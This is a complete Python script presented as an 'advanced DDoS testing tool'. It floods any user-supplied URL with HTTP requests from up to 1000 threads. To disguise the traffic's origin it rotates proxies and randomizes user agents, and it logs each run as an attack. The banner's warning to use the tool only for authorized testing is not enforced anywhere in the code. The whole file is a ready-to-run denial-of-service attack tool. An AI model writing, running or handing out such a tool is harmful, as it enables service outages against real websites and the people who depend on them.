#!/usr/bin/env python3
"""
Advanced DDoS Testing Tool
A professional stress testing utility with advanced features
"""

import threading
import requests
import queue
import time
import os
import sys
import json
import random
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import socket
import ssl
from typing import Dict, List, Optional, Tuple
import logging

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class AdvancedDDoSTool:
    def __init__(self):
        self.url = ""
        self.num_threads = 0
        self.delay = 0
        self.timeout = 10
        self.method = "GET"
        self.proxy_queue = queue.Queue()
        self.stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': None,
            'end_time': None
        }
        self.running = False
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ]
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ddos_attack.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)

    def print_banner(self):
        """Display the tool banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                    ADVANCED DDoS TESTING TOOL                ║
║                        Professional Edition                  ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}Version: 2.0 | Author: Advanced Security Tools{Colors.END}
{Colors.RED}⚠️  WARNING: Use only for authorized testing! ⚠️{Colors.END}
"""
        print(banner)

    def validate_url(self, url: str) -> bool:
        """Validate the target URL"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def load_proxies(self) -> bool:
        """Load proxies from file with advanced handling"""
        if not os.path.exists("proxies.txt"):
            self.logger.warning("proxies.txt not found - using direct connections")
            return False
        
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            if not proxy_list:
                self.logger.warning("No valid proxies found in proxies.txt")
                return False
            
            # Validate proxies
            valid_proxies = []
            for proxy in proxy_list:
                if self.validate_proxy(proxy):
                    valid_proxies.append(proxy)
                    self.proxy_queue.put(proxy)
            
            self.logger.info(f"Loaded {len(valid_proxies)} valid proxies")
            return len(valid_proxies) > 0
            
        except Exception as e:
            self.logger.error(f"Error loading proxies: {e}")
            return False

    def validate_proxy(self, proxy: str) -> bool:
        """Validate proxy format and connectivity"""
        try:
            if ':' not in proxy:
                return False
            
            host, port = proxy.split(':')
            if not port.isdigit():
                return False
            
            # Quick connectivity test
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, int(port)))
            sock.close()
            return result == 0
        except:
            return False

    def get_random_user_agent(self) -> str:
        """Get a random user agent"""
        return random.choice(self.user_agents)

    def create_session(self) -> requests.Session:
        """Create a requests session with advanced settings"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        return session

    def make_request(self, session: requests.Session, proxy: Optional[str] = None) -> Tuple[bool, str]:
        """Make a single request with advanced error handling"""
        try:
            proxies = None
            if proxy:
                proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }

            # Randomize request parameters
            params = {'_': int(time.time() * 1000)} if random.random() > 0.5 else {}
            
            response = session.request(
                method=self.method,
                url=self.url,
                proxies=proxies,
                timeout=self.timeout,
                params=params,
                allow_redirects=True,
                verify=False
            )
            
            self.stats['requests_sent'] += 1
            
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
                return True, f"Status: {response.status_code} | Size: {len(response.content)} bytes"
            else:
                self.stats['failed_requests'] += 1
                return False, f"Status: {response.status_code}"
                
        except requests.exceptions.Timeout:
            self.stats['failed_requests'] += 1
            return False, "Timeout"
        except requests.exceptions.ConnectionError:
            self.stats['failed_requests'] += 1
            return False, "Connection Error"
        except Exception as e:
            self.stats['failed_requests'] += 1
            return False, str(e)[:50]

    def worker(self, worker_id: int):
        """Advanced worker function with better error handling"""
        session = self.create_session()
        proxy_rotation_count = 0
        
        while self.running:
            try:
                # Get proxy if available
                proxy = None
                if not self.proxy_queue.empty():
                    proxy = self.proxy_queue.get()
                    proxy_rotation_count += 1
                
                # Make request
                success, message = self.make_request(session, proxy)
                
                # Log result with colors
                timestamp = datetime.now().strftime("%H:%M:%S")
                proxy_info = proxy if proxy else "DIRECT"
                
                if success:
                    print(f"{Colors.GREEN}[{timestamp}] Worker-{worker_id} | {proxy_info} | {message}{Colors.END}")
                else:
                    print(f"{Colors.RED}[{timestamp}] Worker-{worker_id} | {proxy_info} | {message}{Colors.END}")
                
                # Return proxy to queue for rotation
                if proxy:
                    self.proxy_queue.put(proxy)
                
                # Add delay
                if self.delay > 0:
                    time.sleep(self.delay)
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.logger.error(f"Worker {worker_id} error: {e}")
                time.sleep(1)

    def print_stats(self):
        """Print real-time statistics"""
        if not self.stats['start_time']:
            return
            
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== STATISTICS ==={Colors.END}")
        print(f"{Colors.YELLOW}Total Requests: {self.stats['requests_sent']}{Colors.END}")
        print(f"{Colors.GREEN}Successful: {self.stats['successful_requests']}{Colors.END}")
        print(f"{Colors.RED}Failed: {self.stats['failed_requests']}{Colors.END}")
        print(f"{Colors.BLUE}Success Rate: {(self.stats['successful_requests']/self.stats['requests_sent']*100):.1f}%{Colors.END}")
        print(f"{Colors.PURPLE}Requests/Second: {rps:.2f}{Colors.END}")
        print(f"{Colors.WHITE}Elapsed Time: {elapsed:.1f}s{Colors.END}")

    def save_report(self):
        """Save attack report to file"""
        report = {
            'target_url': self.url,
            'attack_method': self.method,
            'threads_used': self.num_threads,
            'delay': self.delay,
            'statistics': self.stats,
            'timestamp': datetime.now().isoformat()
        }
        
        filename = f"attack_report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Attack report saved to {filename}")

    def run(self):
        """Main execution function"""
        self.print_banner()
        
        # Get user input with validation
        while True:
            self.url = input(f"{Colors.CYAN}Enter target URL: {Colors.END}").strip()
            if self.validate_url(self.url):
                break
            print(f"{Colors.RED}Invalid URL format. Please enter a valid URL.{Colors.END}")
        
        while True:
            try:
                self.num_threads = int(input(f"{Colors.CYAN}Enter number of threads (1-1000): {Colors.END}"))
                if 1 <= self.num_threads <= 1000:
                    break
                print(f"{Colors.RED}Please enter a number between 1 and 1000.{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}Please enter a valid number.{Colors.END}")
        
        while True:
            try:
                self.delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds): {Colors.END}"))
                if self.delay >= 0:
                    break
                print(f"{Colors.RED}Delay must be 0 or positive.{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}Please enter a valid number.{Colors.END}")
        
        # Load proxies
        use_proxies = self.load_proxies()
        
        # Start attack
        print(f"\n{Colors.YELLOW}{Colors.BOLD}Starting attack...{Colors.END}")
        print(f"{Colors.WHITE}Target: {self.url}{Colors.END}")
        print(f"{Colors.WHITE}Threads: {self.num_threads}{Colors.END}")
        print(f"{Colors.WHITE}Delay: {self.delay}s{Colors.END}")
        print(f"{Colors.WHITE}Proxies: {'Enabled' if use_proxies else 'Disabled'}{Colors.END}")
        print(f"{Colors.RED}Press Ctrl+C to stop{Colors.END}\n")
        
        self.stats['start_time'] = time.time()
        self.running = True
        
        # Start worker threads
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            # Monitor and display stats
            while self.running:
                time.sleep(5)
                self.print_stats()
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Stopping attack...{Colors.END}")
            self.running = False
            
            # Wait for threads to finish
            for t in threads:
                t.join(timeout=2)
            
            self.stats['end_time'] = time.time()
            self.print_stats()
            self.save_report()
            
            print(f"\n{Colors.GREEN}Attack completed!{Colors.END}")

def main():
    """Main entry point"""
    try:
        tool = AdvancedDDoSTool()
        tool.run()
    except Exception as e:
        print(f"{Colors.RED}Fatal error: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
